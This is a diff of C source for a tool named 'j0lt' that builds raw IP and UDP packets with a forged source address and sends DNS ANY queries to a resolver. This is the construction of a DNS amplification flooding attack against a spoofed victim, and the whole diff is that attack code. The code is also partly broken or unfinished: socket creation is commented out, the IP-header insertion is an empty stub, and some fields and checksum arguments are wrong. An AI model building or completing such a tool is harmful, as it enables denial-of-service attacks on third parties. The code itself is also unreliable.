@@ -1,6 +1,15 @@
-/* ref: rfc 1034 & 1035
-* sudo tcpdump -X -n udp port 53
+/*
+* For using:
 * ./j0lt <resolver ip> <resolver port> <target ip to spoof> <target port>
+*
+* For reading:
+* https://datatracker.ietf.org/doc/html/rfc1700 (NUMBERS)
+* https://www.rfc-editor.org/rfc/rfc768.html (UDP)
+* https://www.rfc-editor.org/rfc/rfc760 (IP)
+*
+* For testing:
+* use ctrl + ` to bring up a terminal then $ unshare -rn. This will give you suid to test this
+* sudo tcpdump -X -n udp port 53
 */
 
 #include <stdbool.h>
@@ -130,6 +139,10 @@ const char* g_ansi = {
 };
 
 bool
+insert_udp_header(uint8_t** buf, size_t* buflen, const UDPHEADER* header);
+bool
+insert_ip_header(uint8_t** buf, size_t* buflen, const IPHEADER* header);
+bool
 insert_dns_header(uint8_t** buf, size_t* buflen, const DNSHEADER* header);
 bool
 insert_dns_question(void** buf, size_t* buflen, const char* domain, uint16_t query_type, uint16_t query_class);
@@ -154,8 +167,8 @@ main(int argc, char** argv)
     int raw_sockfd;
     bool status;
 
-    DNSHEADER dnsheader;
     UDPHEADER udpheader;
+    DNSHEADER dnsheader;
     IPHEADER ipheader;
     PSEUDOHDR pseudoheader;
 
@@ -165,11 +178,10 @@ main(int argc, char** argv)
         goto fail_state;
     }
 
-    raw_sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    if (raw_sockfd == -1) {
-        fprintf(stderr, "connect_client error\n");
-        goto fail_state;
-    }
+    // raw_sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    // if (raw_sockfd == -1) {
+    //     goto fail_state;
+    // }
 
     resolvip = argv[ 1 ];
     resolvprt = argv[ 2 ];
@@ -186,7 +198,6 @@ main(int argc, char** argv)
     status &= insert_dns_question(( void** ) &curpos, &buflen, "google.com", ns_t_any, ns_c_any);
 
     if (status == false) {
-        fprintf(stderr, "create_dns_packet error\n");
         goto fail_state;
     }
 
@@ -198,36 +209,41 @@ main(int argc, char** argv)
     addr.sin_port = udpheader.uh_dport;
     addr.sin_addr.s_addr = ipheader.saddr;
 
-    sendto(raw_sockfd, pktbuf, nwritten, 0,
-        ( const struct sockaddr* ) &addr,
-        sizeof(addr));
+    status &= insert_udp_header(&curpos, &buflen, &udpheader);
+    status &= insert_ip_header(&curpos, &buflen, &ipheader);
+    if (status == false) {
+        goto fail_state;
+    }
 
+    sendto(raw_sockfd, pktbuf, nwritten, 0, ( const struct sockaddr* ) &addr, sizeof(addr));
     close(raw_sockfd);
+
     return 0;
 
 fail_state:
+    perror("error");
     exit(EXIT_FAILURE);
 }
 
 void
-pack_dnshdr(DNSHEADER* dnshdr, uint8_t opcode, uint8_t rcode)
+pack_iphdr(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, const char* sourceip, const char* destip, size_t nwritten, size_t udpsz)
 {
-    memset(dnshdr, 0, sizeof(DNSHEADER));
-    dnshdr->id = ID;
-    dnshdr->rd = RD;
-    dnshdr->tc = TC;
-    dnshdr->aa = AA;
-    dnshdr->opcode = opcode;
-    dnshdr->qr = QR;
-    dnshdr->rcode = rcode;
-    dnshdr->cd = CD;
-    dnshdr->ad = AD;
-    dnshdr->unused = Z;
-    dnshdr->ra = RA;
-    dnshdr->qdcount = QDCOUNT;
-    dnshdr->ancount = ANCOUNT;
-    dnshdr->nscount = NSCOUNT;
-    dnshdr->arcount = ARCOUNT;
+    memset(iphdr, 0, sizeof(IPHEADER));
+    iphdr->version = IPVER;
+    iphdr->ihl = IHL_MIN;
+    iphdr->tot_len = sizeof(IPHEADER) + nwritten + udpsz;
+    iphdr->id = htons(ID);
+    iphdr->ttl = 0xff;
+    iphdr->protocol = getprotobyname("udp")->p_proto;
+    iphdr->saddr = inet_addr(sourceip);
+    iphdr->daddr = inet_addr(destip);
+
+    memset(pseudohdr, 0, sizeof(PSEUDOHDR));
+    pseudohdr->protocol = iphdr->protocol;
+    pseudohdr->destaddr = iphdr->daddr;
+    pseudohdr->sourceaddr = iphdr->saddr;
+
+    iphdr->check = checksum(( const long* ) &iphdr, ( int ) sizeof(IPHEADER));
 }
 
 void
@@ -254,24 +270,44 @@ pack_udphdr(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr, size_t nwritten, const char
 }
 
 void
-pack_iphdr(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, const char* sourceip, const char* destip, size_t nwritten, size_t udpsz)
+pack_dnshdr(DNSHEADER* dnshdr, uint8_t opcode, uint8_t rcode)
 {
-    memset(iphdr, 0, sizeof(IPHEADER));
-    iphdr->version = IPVER;
-    iphdr->ihl = IHL_MIN;
-    iphdr->tot_len = htons(sizeof(IPHEADER) + nwritten + udpsz);
-    iphdr->id = htonl(ID);
-    iphdr->ttl = 0xff;
-    iphdr->protocol = getprotobyname("udp")->p_proto;
-    iphdr->saddr = inet_addr(sourceip);
-    iphdr->daddr = inet_addr(destip);
+    memset(dnshdr, 0, sizeof(DNSHEADER));
+    dnshdr->id = ID;
+    dnshdr->rd = RD;
+    dnshdr->tc = TC;
+    dnshdr->aa = AA;
+    dnshdr->opcode = opcode;
+    dnshdr->qr = QR;
+    dnshdr->rcode = rcode;
+    dnshdr->cd = CD;
+    dnshdr->ad = AD;
+    dnshdr->unused = Z;
+    dnshdr->ra = RA;
+    dnshdr->qdcount = QDCOUNT;
+    dnshdr->ancount = ANCOUNT;
+    dnshdr->nscount = NSCOUNT;
+    dnshdr->arcount = ARCOUNT;
+}
 
-    memset(&pseudohdr, 0, sizeof(PSEUDOHDR));
-    pseudohdr->protocol = iphdr->protocol;
-    pseudohdr->destaddr = iphdr->daddr;
-    pseudohdr->sourceaddr = iphdr->saddr;
+bool
+insert_ip_header(uint8_t** buf, size_t* buflen, const IPHEADER* header)
+{
 
-    iphdr->check = checksum(( const long* ) &iphdr, ( int ) sizeof(IPHEADER));
+    return true;
+}
+
+bool
+insert_udp_header(uint8_t** buf, size_t* buflen, const UDPHEADER* header)
+{
+    bool status;
+
+    insert_word(buf, buflen, header->uh_dport);
+    insert_word(buf, buflen, header->uh_sport);
+    insert_word(buf, buflen, header->uh_ulen);
+    insert_word(buf, buflen, header->uh_sum);
+
+    return true;
 }
 
 bool
